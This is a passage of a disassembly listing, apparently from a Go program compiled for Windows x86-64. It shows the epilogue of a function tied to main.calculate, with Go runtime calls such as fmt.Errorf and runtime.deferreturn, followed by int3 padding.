   140276c73:	48 8b 01             	mov    rax,QWORD PTR [rcx]
   140276c76:	e8 45 98 df ff       	call   0x1400704c0 <runtime.convT64>
   140276c7b:	48 8d 0d 3e e8 07 00 	lea    rcx,[rip+0x7e83e]        # 0x1402f54c0 '\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\\x92\\xa8\\x8c4\x0f\x08\x08\x02\\x80I8@\x01\x00\x00\x00\\xe82>@\x01\x00\x00\x00\\xb0\t\x00\x00\\x80\\xbe\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00<\\xf2\x02\\x9b\x0f\x08\x08\x07\\x80I8@\x01\x00\x00\x00\\xe82>@'
   140276c82:	48 89 8c 24 30 01 00 	mov    QWORD PTR [rsp+0x130],rcx
   140276c89:	00 
   140276c8a:	48 89 84 24 38 01 00 	mov    QWORD PTR [rsp+0x138],rax
   140276c91:	00 
   140276c92:	48 8d 05 ef 5b 0f 00 	lea    rax,[rip+0xf5bef]        # 0x14036c888 'invalid enable value: %djson: unsupported type: exec: Stdout already setexec: Stderr already setfloa'
   140276c99:	bb 18 00 00 00       	mov    ebx,0x18
   140276c9e:	48 8d 8c 24 30 01 00 	lea    rcx,[rsp+0x130]
   140276ca5:	00 
   140276ca6:	bf 01 00 00 00       	mov    edi,0x1
   140276cab:	48 89 fe             	mov    rsi,rdi
   140276cae:	e8 0d 95 e6 ff       	call   0x1400e01c0 <fmt.Errorf>
   140276cb3:	48 c7 44 24 40 00 00 	mov    QWORD PTR [rsp+0x40],0x0
   140276cba:	00 00 
   140276cbc:	48 89 84 24 d0 00 00 	mov    QWORD PTR [rsp+0xd0],rax
   140276cc3:	00 
   140276cc4:	48 89 9c 24 d8 00 00 	mov    QWORD PTR [rsp+0xd8],rbx
   140276ccb:	00 
   140276ccc:	e8 0f 6e dc ff       	call   0x14003dae0 <runtime.deferreturn>
   140276cd1:	48 8b 9c 24 d0 00 00 	mov    rbx,QWORD PTR [rsp+0xd0]
   140276cd8:	00 
   140276cd9:	48 8b 8c 24 d8 00 00 	mov    rcx,QWORD PTR [rsp+0xd8]
   140276ce0:	00 
   140276ce1:	48 8b 44 24 40       	mov    rax,QWORD PTR [rsp+0x40]
   140276ce6:	48 81 c4 78 01 00 00 	add    rsp,0x178
   140276ced:	5d                   	pop    rbp
   140276cee:	c3                   	ret
   140276cef:	48 89 54 24 40       	mov    QWORD PTR [rsp+0x40],rdx
   140276cf4:	44 0f 11 bc 24 d0 00 	movups XMMWORD PTR [rsp+0xd0],xmm15
   140276cfb:	00 00 
   140276cfd:	0f 1f 00             	nop    DWORD PTR [rax]
   140276d00:	e8 db 6d dc ff       	call   0x14003dae0 <runtime.deferreturn>
   140276d05:	48 8b 9c 24 d0 00 00 	mov    rbx,QWORD PTR [rsp+0xd0]
   140276d0c:	00 
   140276d0d:	48 8b 8c 24 d8 00 00 	mov    rcx,QWORD PTR [rsp+0xd8]
   140276d14:	00 
   140276d15:	48 8b 44 24 40       	mov    rax,QWORD PTR [rsp+0x40]
   140276d1a:	48 81 c4 78 01 00 00 	add    rsp,0x178
   140276d21:	5d                   	pop    rbp
   140276d22:	c3                   	ret
   140276d23:	48 c7 44 24 40 00 00 	mov    QWORD PTR [rsp+0x40],0x0
   140276d2a:	00 00 
   140276d2c:	48 89 84 24 d0 00 00 	mov    QWORD PTR [rsp+0xd0],rax
   140276d33:	00 
   140276d34:	48 89 9c 24 d8 00 00 	mov    QWORD PTR [rsp+0xd8],rbx
   140276d3b:	00 
   140276d3c:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]
   140276d40:	e8 9b 6d dc ff       	call   0x14003dae0 <runtime.deferreturn>
   140276d45:	48 8b 9c 24 d0 00 00 	mov    rbx,QWORD PTR [rsp+0xd0]
   140276d4c:	00 
   140276d4d:	48 8b 8c 24 d8 00 00 	mov    rcx,QWORD PTR [rsp+0xd8]
   140276d54:	00 
   140276d55:	48 8b 44 24 40       	mov    rax,QWORD PTR [rsp+0x40]
   140276d5a:	48 81 c4 78 01 00 00 	add    rsp,0x178
   140276d61:	5d                   	pop    rbp
   140276d62:	c3                   	ret
   140276d63:	49 89 d0             	mov    r8,rdx
   140276d66:	48 21 fa             	and    rdx,rdi
   140276d69:	48 c1 e2 04          	shl    rdx,0x4
   140276d6d:	4c 8b 4c 32 08       	mov    r9,QWORD PTR [rdx+rsi*1+0x8]
   140276d72:	49 39 d9             	cmp    r9,rbx
   140276d75:	74 22                	je     0x140276d99
   140276d77:	49 8d 50 01          	lea    rdx,[r8+0x1]
   140276d7b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]
   140276d80:	4d 85 c9             	test   r9,r9
   140276d83:	75 de                	jne    0x140276d63
   140276d85:	48 8d 05 64 ae 38 00 	lea    rax,[rip+0x38ae64]        # 0x140601bf0 '\x10~e@\x01\x00\x00\x00\\xc0\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00\\xc0\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00@\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@'
   140276d8c:	e8 8f bb d9 ff       	call   0x140012920 <runtime.typeAssert>
   140276d91:	48 89 c2             	mov    rdx,rax
   140276d94:	e9 4a fe ff ff       	jmp    0x140276be3
   140276d99:	48 8b 54 32 10       	mov    rdx,QWORD PTR [rdx+rsi*1+0x10]
   140276d9e:	66 90                	xchg   ax,ax
   140276da0:	e9 3e fe ff ff       	jmp    0x140276be3
   140276da5:	48 89 44 24 08       	mov    QWORD PTR [rsp+0x8],rax
   140276daa:	48 89 5c 24 10       	mov    QWORD PTR [rsp+0x10],rbx
   140276daf:	48 89 4c 24 18       	mov    QWORD PTR [rsp+0x18],rcx
   140276db4:	e8 67 1b e0 ff       	call   0x140078920 <runtime.morestack_noctxt>
   140276db9:	48 8b 44 24 08       	mov    rax,QWORD PTR [rsp+0x8]
   140276dbe:	48 8b 5c 24 10       	mov    rbx,QWORD PTR [rsp+0x10]
   140276dc3:	48 8b 4c 24 18       	mov    rcx,QWORD PTR [rsp+0x18]
   140276dc8:	e9 13 f9 ff ff       	jmp    0x1402766e0 <main.calculate>
   140276dcd:	cc                   	int3
   140276dce:	cc                   	int3
   140276dcf:	cc                   	int3
   140276dd0:	cc                   	int3
   140276dd1:	cc                   	int3
   140276dd2:	cc                   	int3
   140276dd3:	cc                   	int3
   140276dd4:	cc                   	int3
   140276dd5:	cc                   	int3
   140276dd6:	cc                   	int3
   140276dd7:	cc                   	int3
   140276dd8:	cc                   	int3
   140276dd9:	cc                   	int3
   140276dda:	cc                   	int3
   140276ddb:	cc                   	int3
   140276ddc:	cc                   	int3
   140276ddd:	cc                   	int3
   140276dde:	cc                   	int3
   140276ddf:	cc                   	int3
